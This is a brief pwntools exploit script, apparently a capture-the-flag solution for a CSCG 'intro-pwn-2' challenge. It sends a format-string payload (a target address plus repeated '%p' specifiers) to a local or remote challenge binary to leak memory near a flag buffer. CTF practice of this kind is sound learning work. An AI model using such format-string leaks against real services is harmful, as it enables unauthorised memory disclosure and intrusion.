from pwn import *
from binascii import unhexlify


def do_magic(v):
    a = f"{v:08d}"
    return a

local = True

if local:
    p = process("./pwn2")
else:
    p = remote("c89d91deee6b759c6f4aedc5-intro-pwn-2.challenge.master.cscg.live", 31337, ssl=True)


msg = p.recvuntil(b"buffer: \n")
print(msg)

flag_buffer_addr = 0x00000000004040e0

# payload  = p64(flag_buffer_addr) + b"|%p|%p|%p|%p|%p|%p|"
payload  = do_magic(flag_buffer_addr) + "|%p|%p|%p|%p|%p|%p|"
p.sendline(payload)

# msg = p.recv()
# print(unhexlify(msg.split(b"|")[-2][2:]))

p.interactive()


